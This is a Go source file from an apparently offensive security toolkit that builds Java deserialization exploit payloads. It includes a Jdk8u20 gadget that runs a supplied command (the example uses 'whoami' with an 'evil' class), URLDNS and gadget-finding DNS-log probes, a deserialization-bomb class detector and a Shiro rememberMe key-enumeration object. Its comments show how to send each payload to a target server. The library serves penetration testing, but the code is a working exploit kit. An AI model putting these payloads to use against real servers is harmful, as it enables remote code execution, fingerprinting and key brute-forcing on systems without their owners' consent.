// 这些函数使用户能够定制生成的Java对象的特定属性或行为。
//
// options：用于配置Java对象的可变参数函数列表。
// 返回：成功时返回生成的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// command = "whoami"
//
// className = "KEsBXTRS"
//
// gadgetObj,err = yso.GetJdk8u20JavaObject(
//
//	yso.useRuntimeExecEvilClass(command), // 使用Runtime Exec方法执行命令
//	yso.obfuscationClassConstantPool(),
//	yso.evilClassName(className), // 指定恶意类的名称
//
// )
func GetJdk8u20JavaObject(options ...GenClassOptionFun) (*JavaObject, error) {
	return ConfigJavaObject(template_ser_Jdk8u20, "Jdk8u20", options...)
}

// GetURLDNSJavaObject 利用Java URL类的特性，生成一个在反序列化时会尝试对提供的URL执行DNS查询的Java对象。
// 这个函数首先使用预定义的URLDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。
//
// url：要在生成的Java对象中设置的URL字符串。
// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// url, token, _ = risk.NewDNSLogDomain()
//
// javaObject, _ = yso.GetURLDNSJavaObject(url)
//
// gadgetBytes,_ = yso.ToBytes(javaObject)
//
// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
//
// res,err = risk.CheckDNSLogByToken(token)
//
//	if err {
//	  //dnslog查询失败
//	} else {
//	  if len(res) > 0{
//	   // dnslog查询成功
//	  }
//	}
func GetURLDNSJavaObject(url string) (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(template_ser_URLDNS)
	if err != nil {
		return nil, err
	}
	err = ReplaceStringInJavaSerilizable(obj, "1.1.1.1", url, -1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:            "URLDNS",
		NameVerbose:     "URLDNS",
		SupportTemplate: false,
		Help:            "",
	}), nil
}

// GetFindGadgetByDNSJavaObject 通过 DNSLOG 探测 CLass Name，进而探测 Gadget。
// 使用预定义的FindGadgetByDNS序列化模板，然后在序列化对象中替换预设的URL占位符为提供的URL字符串。
//
// url：要在生成的Java对象中设置的URL字符串。
// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// url, token, _ = risk.NewDNSLogDomain()
//
// javaObject, _ = yso.GetFindGadgetByDNSJavaObject(url)
//
// gadgetBytes,_ = yso.ToBytes(javaObject)
//
// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器
//
// res,err = risk.CheckDNSLogByToken(token)
//
//	if err {
//	  //dnslog查询失败
//	} else {
//	  if len(res) > 0{
//	   // dnslog查询成功
//	  }
//	}
func GetFindGadgetByDNSJavaObject(url string) (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(tmeplate_ser_GADGETFINDER)
	if err != nil {
		return nil, err
	}
	err = ReplaceStringInJavaSerilizable(obj, "{{DNSURL}}", url, -1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:            "FindGadgetByDNS",
		NameVerbose:     "FindGadgetByDNS",
		SupportTemplate: false,
		Help:            "",
	}), nil
}

// GetFindClassByBombJavaObject 目标存在指定的 ClassName 时,将会耗部分服务器性能达到间接延时的目的
// 使用预定义的FindClassByBomb序列化模板，然后在序列化对象中替换预设的ClassName占位符为提供的ClassName字符串。
//
// className：要批判的目标服务器是否存在的Class Name值。
//
// 返回：成功时返回构造好的Java对象及nil错误，失败时返回nil及相应错误。
//
// Example:
//
// javaObject, _ = yso.GetFindClassByBombJavaObject("java.lang.String") // 检测目标服务器是否存在 java.lang.String 类
//
// gadgetBytes,_ = yso.ToBytes(javaObject)
//
// 使用构造的反序列化 Payload(gadgetBytes) 发送给目标服务器,通过响应时间判断目标服务器是否存在 java.lang.String 类
func GetFindClassByBombJavaObject(className string) (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(tmeplate_ser_FindClassByBomb)
	if err != nil {
		return nil, err
	}
	err = ReplaceClassNameInJavaSerilizable(obj, "{{ClassName}}", className, -1)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:            "FindClassByBomb",
		NameVerbose:     "FindClassByBomb",
		SupportTemplate: false,
		Help:            "通过构造反序列化炸弹探测Gadget",
	}), nil
}

// GetSimplePrincipalCollectionJavaObject 基于SimplePrincipalCollection 序列化模板生成并返回一个Java对象。
//
// 主要用于 Shiro 漏洞检测时判断 rememberMe cookie 的个数。
//
// 使用一个空的 SimplePrincipalCollection作为 payload，序列化后使用待检测的秘钥进行加密并发送，秘钥正确和错误的响应表现是不一样的，可以使用这个方法来可靠的枚举 Shiro 当前使用的秘钥。
func GetSimplePrincipalCollectionJavaObject() (*JavaObject, error) {
	obj, err := yserx.ParseFromBytes(template_ser_simplePrincipalCollection)
	if err != nil {
		return nil, err
	}
	return verboseWrapper(obj, &GadgetInfo{
		Name:            "SimplePrincipalCollection",
		NameVerbose:     "SimplePrincipalCollection",
		SupportTemplate: false,
		Help:            "",
	}), nil
}

// GetAllGadget 获取所有的支持的Gadget
func GetAllGadget() []interface{} {
	alGadget := []any{}
	for _, gadget := range AllGadgets {
		alGadget = append(alGadget, gadget.Generator)
	}
	return alGadget
}

// GetAllTemplatesGadget 获取所有的支持的模板Gadget
func GetAllTemplatesGadget() []TemplatesGadget {
	alGadget := []TemplatesGadget{}
	for _, gadget := range AllGadgets {
		if gadget.SupportTemplate {
			alGadget = append(alGadget, gadget.Generator.(func(options ...GenClassOptionFun) (*JavaObject, error)))
		}
	}
	return alGadget
}

// GetAllRuntimeExecGadget 获取所有的支持的RuntimeExecGadget
func GetAllRuntimeExecGadget() []RuntimeExecGadget {
	alGadget := []RuntimeExecGadget{}
	for _, gadget := range AllGadgets {
		if !gadget.SupportTemplate {
			alGadget = append(alGadget, gadget.Generator.(func(cmd string) (*JavaObject, error)))
		}
	}
	return alGadget
}
